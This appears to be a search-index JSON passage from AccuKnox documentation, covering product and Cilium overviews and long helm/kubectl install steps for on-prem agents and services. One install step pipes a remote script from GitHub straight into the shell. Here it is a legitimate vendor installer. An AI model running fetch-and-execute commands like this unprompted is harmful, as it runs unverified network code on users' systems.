{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-\\.]+"},"docs":[{"location":"","text":"Cloud Native Application Observability and Protection \u00b6 AccuKnox automates observability and zero trust security for cloud native applications, as well as VM and bare metal. We provide easy-to-use open-source tools for visibility and protection of your application, data and network, integrated into a Policy-as-Code GitOps workflow. Modern Kubernetes and other cloud applications include: \u00b6 Dozens of open source libraries, all of which come with inherent supply chain risks; Example a recent study found that more than half the docker images had some vulnerability. It is not entirely common but sometimes unpatched vulnerabilities, or misconfigurations slip through in production Zero-day attacks that create chaos as workloads can be compromised until a patch has been applied.. In such a scenario, applications can be compromised and once they are, they can initiate a wide range of malicious activity even if not running as a root. Accuknox provides runtime security for your Kubernetes workloads to prevent malicious activity as determined by MITRE and other indicators of compromise and stops your workload from behaving maliciously at runtime. This gives you the necessary guardrails to restrict application behavior within a set of predefined policies while you apply a patch. Unlike traditional solutions that recommend a full quarantine of the workloads, accuknox's runtime solution can provide you active runtime protection allowing you to only restrict the malicious behavior as opposed to the entire workload.","title":"Intro"},{"location":"#cloud-native-application-observability-and-protection","text":"AccuKnox automates observability and zero trust security for cloud native applications, as well as VM and bare metal. We provide easy-to-use open-source tools for visibility and protection of your application, data and network, integrated into a Policy-as-Code GitOps workflow.","title":"Cloud Native Application Observability and Protection"},{"location":"#modern-kubernetes-and-other-cloud-applications-include","text":"Dozens of open source libraries, all of which come with inherent supply chain risks; Example a recent study found that more than half the docker images had some vulnerability. It is not entirely common but sometimes unpatched vulnerabilities, or misconfigurations slip through in production Zero-day attacks that create chaos as workloads can be compromised until a patch has been applied.. In such a scenario, applications can be compromised and once they are, they can initiate a wide range of malicious activity even if not running as a root. Accuknox provides runtime security for your Kubernetes workloads to prevent malicious activity as determined by MITRE and other indicators of compromise and stops your workload from behaving maliciously at runtime. This gives you the necessary guardrails to restrict application behavior within a set of predefined policies while you apply a patch. Unlike traditional solutions that recommend a full quarantine of the workloads, accuknox's runtime solution can provide you active runtime protection allowing you to only restrict the malicious behavior as opposed to the entire workload.","title":"Modern Kubernetes and other cloud applications include:"},{"location":"cilium/","text":"What is Cilium? \u00b6 Cilium is open source software for transparently providing and securing the network and API connectivity between application services deployed using Linux container management platforms such as Kubernetes. See the section Introduction to Cilium for a more detailed general introduction to Cilium. Accuknox and Cilium \u00b6 At Accuknox we are focused on adding value to Cilium in the following areas by using: Extensible Identity solution based on SPIFFE standards: Improving policy audit handling. Improving policy telemetry and statistics collection to fit realistic scenarios. Policy discovery tools. eBPF-based Networking, Observability, and Security \u00b6 Cilium is an open source software for providing, securing and observing network connectivity between container workloads - cloud native, and fueled by the revolutionary Kernel technology eBPF. Cilium 1.11 \u00b6 The latest release of Cilium 1.11 includes extra features for Kubernetes and standalone load-balancer deployments. OpenTelemetry Support : Ability to export Hubble's L3-L7 observability data in OpenTelemetry tracing and metrics format. ( More details ) Kubernetes APIServer Policy Matching : New policy entity for hassle-free policy modeling of communication from/to the Kubernetes API server. ( More details ) Topology Aware Routing : Enhanced load-balancing with support for topology-aware hints to route traffic to the closest endpoint, or to keep traffic within a region. ( More details ) BGP Pod CIDR Announcement : Advertise PodCIDR IP routes to your network using BGP ( More details ) Graceful Service Backend Termination : Support for graceful connection termination in order to drain network traffic when load-balancing to pods that are being terminated. ( More details ) Host Firewall Promotion : Host firewall functionality has been promoted to stable and is ready for production use ( More details ) Improved Load Balancer Scalability : Cilium load balancing now supports more than 64K backend endpoints. ( More details ) Improved Load Balancer Device Support : The accelerated XDP fast-path for load-balancing can now be used with bonded devices ( More details ) and more generally also in multi-device setups. ( More details ) Istio Support with Kube-Proxy-Replacement : Cilium's kube-proxy replacement mode is now compatible with Istio sidecar deployments. ( More details ) Egress Gateway Improvements : Enhancements to the egress gateway functionality, including support for additional datapath modes. ( More details ) Managed IPv4/IPv6 Neighbor Discovery : Extensions to both the Linux kernel as well as Cilium's load-balancer in order to remove its internal ARP library and delegate the next hop discovery for IPv4 and now also IPv6 nodes to the kernel. ( More details ) Route-based Device Detection : Improved user experience for multi-device setups with Cilium through route-based auto-detection of external-facing network devices. ( More details ) Kubernetes Cgroup Enhancements : Enhancements to Cilium's kube-proxy replacement integration for runtimes operating in pure cgroup v2 mode as well as Linux kernel improvements for Kubernetes mixed mode cgroup v1/v2 environments. ( More details ) Cilium Endpoint Slices : Cilium is now more efficient in CRD mode with its control-plane interactions with Kubernetes, enabling 1000+ node scalability in a way that previously required a dedicated Etcd instance to manage. ( More details ) Mirantis Kubernetes Engine Integration : Support for Mirantis Kubernetes Engine. ( More details )","title":"Cilium"},{"location":"cilium/#what-is-cilium","text":"Cilium is open source software for transparently providing and securing the network and API connectivity between application services deployed using Linux container management platforms such as Kubernetes. See the section Introduction to Cilium for a more detailed general introduction to Cilium.","title":"What is Cilium?"},{"location":"cilium/#accuknox-and-cilium","text":"At Accuknox we are focused on adding value to Cilium in the following areas by using: Extensible Identity solution based on SPIFFE standards: Improving policy audit handling. Improving policy telemetry and statistics collection to fit realistic scenarios. Policy discovery tools.","title":"Accuknox and Cilium"},{"location":"cilium/#ebpf-based-networking-observability-and-security","text":"Cilium is an open source software for providing, securing and observing network connectivity between container workloads - cloud native, and fueled by the revolutionary Kernel technology eBPF.","title":"eBPF-based  Networking,  Observability, and  Security"},{"location":"cilium/#cilium-111","text":"The latest release of Cilium 1.11 includes extra features for Kubernetes and standalone load-balancer deployments. OpenTelemetry Support : Ability to export Hubble's L3-L7 observability data in OpenTelemetry tracing and metrics format. ( More details ) Kubernetes APIServer Policy Matching : New policy entity for hassle-free policy modeling of communication from/to the Kubernetes API server. ( More details ) Topology Aware Routing : Enhanced load-balancing with support for topology-aware hints to route traffic to the closest endpoint, or to keep traffic within a region. ( More details ) BGP Pod CIDR Announcement : Advertise PodCIDR IP routes to your network using BGP ( More details ) Graceful Service Backend Termination : Support for graceful connection termination in order to drain network traffic when load-balancing to pods that are being terminated. ( More details ) Host Firewall Promotion : Host firewall functionality has been promoted to stable and is ready for production use ( More details ) Improved Load Balancer Scalability : Cilium load balancing now supports more than 64K backend endpoints. ( More details ) Improved Load Balancer Device Support : The accelerated XDP fast-path for load-balancing can now be used with bonded devices ( More details ) and more generally also in multi-device setups. ( More details ) Istio Support with Kube-Proxy-Replacement : Cilium's kube-proxy replacement mode is now compatible with Istio sidecar deployments. ( More details ) Egress Gateway Improvements : Enhancements to the egress gateway functionality, including support for additional datapath modes. ( More details ) Managed IPv4/IPv6 Neighbor Discovery : Extensions to both the Linux kernel as well as Cilium's load-balancer in order to remove its internal ARP library and delegate the next hop discovery for IPv4 and now also IPv6 nodes to the kernel. ( More details ) Route-based Device Detection : Improved user experience for multi-device setups with Cilium through route-based auto-detection of external-facing network devices. ( More details ) Kubernetes Cgroup Enhancements : Enhancements to Cilium's kube-proxy replacement integration for runtimes operating in pure cgroup v2 mode as well as Linux kernel improvements for Kubernetes mixed mode cgroup v1/v2 environments. ( More details ) Cilium Endpoint Slices : Cilium is now more efficient in CRD mode with its control-plane interactions with Kubernetes, enabling 1000+ node scalability in a way that previously required a dedicated Etcd instance to manage. ( More details ) Mirantis Kubernetes Engine Integration : Support for Mirantis Kubernetes Engine. ( More details )","title":"Cilium 1.11"},{"location":"license/","text":"License \u00b6 MIT License The graduate cap icon made by Freepik from www.flaticon.com is licensed by CC 3.0 BY","title":"License"},{"location":"license/#license","text":"MIT License The graduate cap icon made by Freepik from www.flaticon.com is licensed by CC 3.0 BY","title":"License"},{"location":"Devops/getting-started/","text":"","title":"Getting started"},{"location":"accuknox-onprem/FAQ/","text":"FAQ \u00b6 1. Can I skip Pinot and send logs to my elastic or splunk cluster? \u00b6 Yes, it's feasible. The feeder agent sends the logs to /var/log/*.log which can be pushed to ELK stack. Please refer accuknox-onprem/elastic for specific details. 2.Can I send metrics to my time series? \u00b6 Yes, it's feasible.Install a GRPc server, with TCP IP and port. Map the GRPC server IP and port in Feeder Service. method","title":"FAQ"},{"location":"accuknox-onprem/FAQ/#faq","text":"","title":"FAQ"},{"location":"accuknox-onprem/FAQ/#1-can-i-skip-pinot-and-send-logs-to-my-elastic-or-splunk-cluster","text":"Yes, it's feasible. The feeder agent sends the logs to /var/log/*.log which can be pushed to ELK stack. Please refer accuknox-onprem/elastic for specific details.","title":"1. Can I skip Pinot and send logs to my elastic or splunk cluster?"},{"location":"accuknox-onprem/FAQ/#2can-i-send-metrics-to-my-time-series","text":"Yes, it's feasible.Install a GRPc server, with TCP IP and port. Map the GRPC server IP and port in Feeder Service. method","title":"2.Can I send metrics to my time series?"},{"location":"accuknox-onprem/agents-install/","text":"Note \u00b6 Step 1: Onboarding the cluster to the accuknox UI (Eg. CWPP cluster). Step 2: Fetch the cluster id and workload id for the below agents installation. Installing Helm \u00b6 This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases. From the Binary Releases \u00b6 Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed. Download your desired version Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz) Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm) Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question. For more reference: Click here.. Add accuknox repository to install Agents helm package: \u00b6 helm repo add accuknox-onprem-agents https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-agents helm repo update helm search repo accuknox-onprem-agents Follow the below order to install agents on k8s cluster. Cilium \u00b6 Cilium is open source software for transparently securing the network connectivity between application services deployed using Linux container management platforms like Docker and Kubernetes. At the foundation of Cilium is a new Linux kernel technology called BPF, which enables the dynamic insertion of powerful security visibility and control logic within Linux itself. Because BPF runs inside the Linux kernel, Cilium security policies can be applied and updated without any changes to the application code or container configuration. Installation \u00b6 Note 1.10.5 having crashingloopback issues, so we are using 1.9.8 curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256 cilium install --version 1 .9.8 cilium hubble enable Validate the cilium Installation \u00b6 To validate that Cilium has been properly installed, you can run cilium status --wait Refer official site: https://docs.cilium.io/en/stable/gettingstarted/k8s-install-default/ kArmor cli tool \u00b6 kArmor is a CLI client to help manage KubeArmor. kArmor tool can be used to install/uninstall kubearmor. Additionally it can be used to view kubearmor logs and other resources used by kubearmor. Installation \u00b6 curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sh karmor install #Installs Kubearmor kubectl get pods -n kubesystem | grep kubearmor FYR: https://github.com/kubearmor/kubearmor-client Refer official site: https://www.accuknox.com/kubearmor/ Shared-informer-agent \u00b6 kubectl create ns accuknox-agents helm upgrade --install accuknox-shared-informer-agent accuknox-onprem-agents/shared-informer-agent-chart-1.0.1.tgz -n accuknox-agents Policy Enforcement Agent \u00b6 kubectl create ns policy-agent helm upgrade --install accuknox-policy-enforcement-agent accuknox-onprem-agents/policy-enforcement-agent -n policy-agent kubectl set env deploy/policy-enforcement-agent -n policy-agent workspace_id = <wid> Note: wid - workspace id number fetch from Accuknox UI. Feeder-Service \u00b6 kubectl create ns accuknox-feeder-service helm upgrade --install accuknox-feeder-service accuknox-onprem-agents/feeder-service -n accuknox-feeder-service Knox-Containersec \u00b6 helm upgrade --install accuknox-knox-containersec accuknox-onprem-agents/knox-containersec-chart -n accuknox-agents S3-audit-reporter \u00b6 kubectl create ns accuknox-s3-audit-reporter-agent helm upgrade --install accuknox-s3-audit-reporter-agent accuknox-onprem-agents/s3-audit-reporter-charts -n accuknox-s3-audit-reporter-agent","title":"Agents install"},{"location":"accuknox-onprem/agents-install/#note","text":"Step 1: Onboarding the cluster to the accuknox UI (Eg. CWPP cluster). Step 2: Fetch the cluster id and workload id for the below agents installation.","title":"Note"},{"location":"accuknox-onprem/agents-install/#installing-helm","text":"This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases.","title":"Installing Helm"},{"location":"accuknox-onprem/agents-install/#from-the-binary-releases","text":"Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed. Download your desired version Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz) Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm) Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question. For more reference: Click here..","title":"From the Binary Releases"},{"location":"accuknox-onprem/agents-install/#add-accuknox-repository-to-install-agents-helm-package","text":"helm repo add accuknox-onprem-agents https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-agents helm repo update helm search repo accuknox-onprem-agents Follow the below order to install agents on k8s cluster.","title":"Add accuknox repository to install Agents helm package:"},{"location":"accuknox-onprem/agents-install/#cilium","text":"Cilium is open source software for transparently securing the network connectivity between application services deployed using Linux container management platforms like Docker and Kubernetes. At the foundation of Cilium is a new Linux kernel technology called BPF, which enables the dynamic insertion of powerful security visibility and control logic within Linux itself. Because BPF runs inside the Linux kernel, Cilium security policies can be applied and updated without any changes to the application code or container configuration.","title":"Cilium"},{"location":"accuknox-onprem/agents-install/#installation","text":"Note 1.10.5 having crashingloopback issues, so we are using 1.9.8 curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256 cilium install --version 1 .9.8 cilium hubble enable","title":"Installation"},{"location":"accuknox-onprem/agents-install/#validate-the-cilium-installation","text":"To validate that Cilium has been properly installed, you can run cilium status --wait Refer official site: https://docs.cilium.io/en/stable/gettingstarted/k8s-install-default/","title":"Validate the cilium Installation"},{"location":"accuknox-onprem/agents-install/#karmor-cli-tool","text":"kArmor is a CLI client to help manage KubeArmor. kArmor tool can be used to install/uninstall kubearmor. Additionally it can be used to view kubearmor logs and other resources used by kubearmor.","title":"kArmor cli tool"},{"location":"accuknox-onprem/agents-install/#installation_1","text":"curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sh karmor install #Installs Kubearmor kubectl get pods -n kubesystem | grep kubearmor FYR: https://github.com/kubearmor/kubearmor-client Refer official site: https://www.accuknox.com/kubearmor/","title":"Installation"},{"location":"accuknox-onprem/agents-install/#shared-informer-agent","text":"kubectl create ns accuknox-agents helm upgrade --install accuknox-shared-informer-agent accuknox-onprem-agents/shared-informer-agent-chart-1.0.1.tgz -n accuknox-agents","title":"Shared-informer-agent"},{"location":"accuknox-onprem/agents-install/#policy-enforcement-agent","text":"kubectl create ns policy-agent helm upgrade --install accuknox-policy-enforcement-agent accuknox-onprem-agents/policy-enforcement-agent -n policy-agent kubectl set env deploy/policy-enforcement-agent -n policy-agent workspace_id = <wid> Note: wid - workspace id number fetch from Accuknox UI.","title":"Policy Enforcement Agent"},{"location":"accuknox-onprem/agents-install/#feeder-service","text":"kubectl create ns accuknox-feeder-service helm upgrade --install accuknox-feeder-service accuknox-onprem-agents/feeder-service -n accuknox-feeder-service","title":"Feeder-Service"},{"location":"accuknox-onprem/agents-install/#knox-containersec","text":"helm upgrade --install accuknox-knox-containersec accuknox-onprem-agents/knox-containersec-chart -n accuknox-agents","title":"Knox-Containersec"},{"location":"accuknox-onprem/agents-install/#s3-audit-reporter","text":"kubectl create ns accuknox-s3-audit-reporter-agent helm upgrade --install accuknox-s3-audit-reporter-agent accuknox-onprem-agents/s3-audit-reporter-charts -n accuknox-s3-audit-reporter-agent","title":"S3-audit-reporter"},{"location":"accuknox-onprem/agents-verify/","text":"","title":"Agents verify"},{"location":"accuknox-onprem/ak-architecture-diagram-purpose/","text":"","title":"Ak architecture diagram purpose"},{"location":"accuknox-onprem/ak-architecture-diagram/","text":"","title":"Ak architecture diagram"},{"location":"accuknox-onprem/core-components-install/","text":"Installing Helm \u00b6 This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases. From the Binary Releases \u00b6 Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed. Download your desired version Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz) Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm) Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question. For more reference: Click here.. Add accuknox repository to install Core Components helm package: \u00b6 helm repo add accuknox-onprem-services https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-services helm repo update helm search repo accuknox-onprem-services Follow the below order to install onprem-services on k8s cluster Keycloak \u00b6 Step 1 : kubectl create ns accuknox-user-mgmt Step 2: helm upgrade --install accuknox-keycloak accuknox-onprem-services/keycloak -n accuknox-user-mgmt Usermanagement \u00b6 helm upgrade --install accuknox-user-mgmt-service accuknox-onprem-services/user-management-service -n accuknox-user-mgmt Agents-Auth-Service \u00b6 Step 1 : kubectl create ns accuknox-agents-auth-service Step 2 : helm upgrade --install accuknox-agents-auth-service accuknox-onprem-services/agents-auth-service-charts -n accuknox-agents-auth-service Anomaly-detection-publisher-core \u00b6 Step 1 : kubectl create ns accuknox-ad-core Step 2 : helm upgrade --install accuknox-ad-core accuknox-onprem-services/anomaly-detection-publisher-core-chart -n accuknox-ad-core Cluster-management-service \u00b6 Step 1 : kubectl create ns accuknox-cluster-mgmt Step 2 : helm upgrade --install accuknox-cluster-mgmt accuknox-onprem-services/cluster-management-service-chart -n accuknox-cluster-mgmt Anomaly-detection-management \u00b6 Step 1 : kubectl create ns accuknox-ad-mgmt Step 2 : helm upgrade --install accuknox-ad-mgmt accuknox-onprem-services/anomaly-detection-mgmt-chart -n accuknox-ad-mgmt Data-protection-mgmt \u00b6 Step 1 : kubectl create ns accuknox-dp-mgmt Step 2 : helm upgrade --install accuknox-dp-mgmt accuknox-onprem-services/data-protection-mgmt -n accuknox-dp-mgmt Data-protection-core \u00b6 Step 1 : kubectl create ns accuknox-dp-core Step 2 : helm upgrade --install accuknox-dp-core accuknox-onprem-services/data-protection-core -n accuknox-dp-core Data-protection-consumer \u00b6 Step 1 : helm upgrade --install accuknox-data-protection-consumer accuknox-onprem-services/data-protection-consumer -n accuknox-dp-core S3-audit-report-consumer \u00b6 Step 1 : kubectl create ns accuknox-s3-audit-reporter-consumer Step 2 : helm upgrade --install accuknox-s3-audit-reporter-consumer accuknox-onprem-services/s3-audit-reporter-consumer-charts -n accuknox-s3-audit-reporter-consumer Dp-db-audit-log-processor \u00b6 Step 1 : helm upgrade --install accuknox-dp-db-audit-log-processor accuknox-onprem-services/dp-db-audit-log-processor-chart -n accuknox-dp-core Data-classification-pipeline-consumer \u00b6 Step 1 : kubectl create ns accuknox-data-classification-pipeline-consumer Step 2 : helm upgrade --install accuknox-data-classification-pipeline-consumer accuknox-onprem-services/data-classification-pipeline-consumer-chart -n accuknox-data-classification-pipeline-consumer Agent-data-collector \u00b6 Step 1 : kubectl create ns accuknox-adc Step 2 : helm upgrade --install accuknox-adc accuknox-onprem-services/agent-data-collector-charts -n accuknox-adc Cluster-onboarding-service \u00b6 Step 1 : kubectl create ns accuknox-cluster-onboard Step 2 : helm upgrade --install accuknox-cluster-onboard accuknox-onprem-services/cluster-onboarding-service -n accuknox-cluster-onboard Cluster-entity-daemon \u00b6 Step 1 : kubectl create ns accuknox-cluster-entity-daemon Step 2 : helm upgrade --install accuknox-cluster-entity-daemon accuknox-onprem-services/cluster-entity-daemon-chart -n accuknox-cluster-entity-daemon Shared-informer-service \u00b6 Step 1 : kubectl create ns accuknox-shared-informer-service Step 2 : helm upgrade --install accuknox-shared-informer-service accuknox-onprem-services/shared-informer-service-chart -n accuknox-shared-informer-service Data-pipeline-api \u00b6 Step 1 : kubectl create ns accuknox-datapipeline-api Step 2 : helm upgrade --install accuknox-datapipeline-api accuknox-onprem-services/data-pipeline-api-charts -n accuknox-datapipeline-api Datapipeline-temporal \u00b6 Step 1 : kubectl create ns accuknox-temporal Step 2 : helm upgrade --install accuknox-temporal accuknox-onprem-services/datapipeline-temporal-charts -n accuknox-temporal Zookeeper \u00b6 Step 1 : kubectl create ns accuknox-samzajobs Step 2 : helm upgrade --install accuknox-zookeeper accuknox-onprem-services/zookeeper -n accuknox-samzajobs Data-pipeline-samza-jobs \u00b6 Step 1 : helm upgrade --install accuknox-samzajobs accuknox-onprem-services/datapipeline-samza -n accuknox-samzajobs Feeder-grpc-server \u00b6 Step 1 : kubectl create ns accuknox-feeder-grpc-server Step 2 : helm upgrade --install accuknox-feeder-grpc-server accuknox-onprem-services/feeder-grpc-server-chart -n accuknox-feeder-grpc-server Policy-service \u00b6 Step 1 : kubectl create ns accuknox-policy-service Step 2 : helm upgrade --install accuknox-policy-service accuknox-onprem-services/policy-service-charts -n accuknox-policy-service Policy-daemon \u00b6 Step 1 : kubectl create ns accuknox-policy-daemon Step 2 : helm upgrade --install accuknox-policy-daemon accuknox-onprem-services/policy-daemon-charts -n accuknox-policy-daemon Policy-provider-service \u00b6 Step 1 : kubectl create ns accuknox-policy-provider-service Step 2 : helm upgrade --install accuknox-policy-provider-service accuknox-onprem-services/policy-provider-service -n accuknox-policy-provider-service Workload-identity-daemon \u00b6 Step 1 : kubectl create ns accuknox-workload-identity-daemon Step 2 : helm upgrade --install accuknox-workload-identity-daemon accuknox-onprem-services/workload-identity-daemon-chart -n accuknox-workload-identity-daemon Recommended-policy-daemon \u00b6 Step 1 : kubectl create ns accuknox-recommended-policy-daemon Step 2 : helm upgrade --install accuknox-recommended-policy-daemon accuknox-onprem-services/recommended-policy-daemon -n accuknox-recommended-policy-daemon Discoveredpolicy-daemon \u00b6 Step 1 : kubectl create ns accuknox-discovered-policy-daemon Step 2 : helm upgrade --install accuknox-discovered-policy-daemon accuknox-onprem-services/discoveredpolicy-daemon-charts -n accuknox-discovered-policy-daemon Label-service \u00b6 Step 1 : kubectl create ns accuknox-label-service Step 2 : helm upgrade --install accuknox-label-service accuknox-onprem-services/label-service-chart -n accuknox-label-service Knox-auto-policy \u00b6 Step 1 : kubectl create ns accuknox-knoxautopolicy Step 2 : helm upgrade --install accuknox-knoxautopolicy accuknox-onprem-services/knox-auto-policy-chart -n accuknox-knoxautopolicy Kvm-service \u00b6 Step 1 : kubectl create ns accuknox-kvmservice Step 2 : helm upgrade --install accuknox-kvmservice accuknox-onprem-services/kvm-service-chart -n accuknox-kvmservice","title":"Core components install"},{"location":"accuknox-onprem/core-components-install/#installing-helm","text":"This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases.","title":"Installing Helm"},{"location":"accuknox-onprem/core-components-install/#from-the-binary-releases","text":"Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed. Download your desired version Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz) Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm) Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question. For more reference: Click here..","title":"From the Binary Releases"},{"location":"accuknox-onprem/core-components-install/#add-accuknox-repository-to-install-core-components-helm-package","text":"helm repo add accuknox-onprem-services https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-services helm repo update helm search repo accuknox-onprem-services Follow the below order to install onprem-services on k8s cluster","title":"Add accuknox repository to install Core Components helm package:"},{"location":"accuknox-onprem/core-components-install/#keycloak","text":"Step 1 : kubectl create ns accuknox-user-mgmt Step 2: helm upgrade --install accuknox-keycloak accuknox-onprem-services/keycloak -n accuknox-user-mgmt","title":"Keycloak"},{"location":"accuknox-onprem/core-components-install/#usermanagement","text":"helm upgrade --install accuknox-user-mgmt-service accuknox-onprem-services/user-management-service -n accuknox-user-mgmt","title":"Usermanagement"},{"location":"accuknox-onprem/core-components-install/#agents-auth-service","text":"Step 1 : kubectl create ns accuknox-agents-auth-service Step 2 : helm upgrade --install accuknox-agents-auth-service accuknox-onprem-services/agents-auth-service-charts -n accuknox-agents-auth-service","title":"Agents-Auth-Service"},{"location":"accuknox-onprem/core-components-install/#anomaly-detection-publisher-core","text":"Step 1 : kubectl create ns accuknox-ad-core Step 2 : helm upgrade --install accuknox-ad-core accuknox-onprem-services/anomaly-detection-publisher-core-chart -n accuknox-ad-core","title":"Anomaly-detection-publisher-core"},{"location":"accuknox-onprem/core-components-install/#cluster-management-service","text":"Step 1 : kubectl create ns accuknox-cluster-mgmt Step 2 : helm upgrade --install accuknox-cluster-mgmt accuknox-onprem-services/cluster-management-service-chart -n accuknox-cluster-mgmt","title":"Cluster-management-service"},{"location":"accuknox-onprem/core-components-install/#anomaly-detection-management","text":"Step 1 : kubectl create ns accuknox-ad-mgmt Step 2 : helm upgrade --install accuknox-ad-mgmt accuknox-onprem-services/anomaly-detection-mgmt-chart -n accuknox-ad-mgmt","title":"Anomaly-detection-management"},{"location":"accuknox-onprem/core-components-install/#data-protection-mgmt","text":"Step 1 : kubectl create ns accuknox-dp-mgmt Step 2 : helm upgrade --install accuknox-dp-mgmt accuknox-onprem-services/data-protection-mgmt -n accuknox-dp-mgmt","title":"Data-protection-mgmt"},{"location":"accuknox-onprem/core-components-install/#data-protection-core","text":"Step 1 : kubectl create ns accuknox-dp-core Step 2 : helm upgrade --install accuknox-dp-core accuknox-onprem-services/data-protection-core -n accuknox-dp-core","title":"Data-protection-core"},{"location":"accuknox-onprem/core-components-install/#data-protection-consumer","text":"Step 1 : helm upgrade --install accuknox-data-protection-consumer accuknox-onprem-services/data-protection-consumer -n accuknox-dp-core","title":"Data-protection-consumer"},{"location":"accuknox-onprem/core-components-install/#s3-audit-report-consumer","text":"Step 1 : kubectl create ns accuknox-s3-audit-reporter-consumer Step 2 : helm upgrade --install accuknox-s3-audit-reporter-consumer accuknox-onprem-services/s3-audit-reporter-consumer-charts -n accuknox-s3-audit-reporter-consumer","title":"S3-audit-report-consumer"},{"location":"accuknox-onprem/core-components-install/#dp-db-audit-log-processor","text":"Step 1 : helm upgrade --install accuknox-dp-db-audit-log-processor accuknox-onprem-services/dp-db-audit-log-processor-chart -n accuknox-dp-core","title":"Dp-db-audit-log-processor"},{"location":"accuknox-onprem/core-components-install/#data-classification-pipeline-consumer","text":"Step 1 : kubectl create ns accuknox-data-classification-pipeline-consumer Step 2 : helm upgrade --install accuknox-data-classification-pipeline-consumer accuknox-onprem-services/data-classification-pipeline-consumer-chart -n accuknox-data-classification-pipeline-consumer","title":"Data-classification-pipeline-consumer"},{"location":"accuknox-onprem/core-components-install/#agent-data-collector","text":"Step 1 : kubectl create ns accuknox-adc Step 2 : helm upgrade --install accuknox-adc accuknox-onprem-services/agent-data-collector-charts -n accuknox-adc","title":"Agent-data-collector"},{"location":"accuknox-onprem/core-components-install/#cluster-onboarding-service","text":"Step 1 : kubectl create ns accuknox-cluster-onboard Step 2 : helm upgrade --install accuknox-cluster-onboard accuknox-onprem-services/cluster-onboarding-service -n accuknox-cluster-onboard","title":"Cluster-onboarding-service"},{"location":"accuknox-onprem/core-components-install/#cluster-entity-daemon","text":"Step 1 : kubectl create ns accuknox-cluster-entity-daemon Step 2 : helm upgrade --install accuknox-cluster-entity-daemon accuknox-onprem-services/cluster-entity-daemon-chart -n accuknox-cluster-entity-daemon","title":"Cluster-entity-daemon"},{"location":"accuknox-onprem/core-components-install/#shared-informer-service","text":"Step 1 : kubectl create ns accuknox-shared-informer-service Step 2 : helm upgrade --install accuknox-shared-informer-service accuknox-onprem-services/shared-informer-service-chart -n accuknox-shared-informer-service","title":"Shared-informer-service"},{"location":"accuknox-onprem/core-components-install/#data-pipeline-api","text":"Step 1 : kubectl create ns accuknox-datapipeline-api Step 2 : helm upgrade --install accuknox-datapipeline-api accuknox-onprem-services/data-pipeline-api-charts -n accuknox-datapipeline-api","title":"Data-pipeline-api"},{"location":"accuknox-onprem/core-components-install/#datapipeline-temporal","text":"Step 1 : kubectl create ns accuknox-temporal Step 2 : helm upgrade --install accuknox-temporal accuknox-onprem-services/datapipeline-temporal-charts -n accuknox-temporal","title":"Datapipeline-temporal"},{"location":"accuknox-onprem/core-components-install/#zookeeper","text":"Step 1 : kubectl create ns accuknox-samzajobs Step 2 : helm upgrade --install accuknox-zookeeper accuknox-onprem-services/zookeeper -n accuknox-samzajobs","title":"Zookeeper"},{"location":"accuknox-onprem/core-components-install/#data-pipeline-samza-jobs","text":"Step 1 : helm upgrade --install accuknox-samzajobs accuknox-onprem-services/datapipeline-samza -n accuknox-samzajobs","title":"Data-pipeline-samza-jobs"},{"location":"accuknox-onprem/core-components-install/#feeder-grpc-server","text":"Step 1 : kubectl create ns accuknox-feeder-grpc-server Step 2 : helm upgrade --install accuknox-feeder-grpc-server accuknox-onprem-services/feeder-grpc-server-chart -n accuknox-feeder-grpc-server","title":"Feeder-grpc-server"},{"location":"accuknox-onprem/core-components-install/#policy-service","text":"Step 1 : kubectl create ns accuknox-policy-service Step 2 : helm upgrade --install accuknox-policy-service accuknox-onprem-services/policy-service-charts -n accuknox-policy-service","title":"Policy-service"},{"location":"accuknox-onprem/core-components-install/#policy-daemon","text":"Step 1 : kubectl create ns accuknox-policy-daemon Step 2 : helm upgrade --install accuknox-policy-daemon accuknox-onprem-services/policy-daemon-charts -n accuknox-policy-daemon","title":"Policy-daemon"},{"location":"accuknox-onprem/core-components-install/#policy-provider-service","text":"Step 1 : 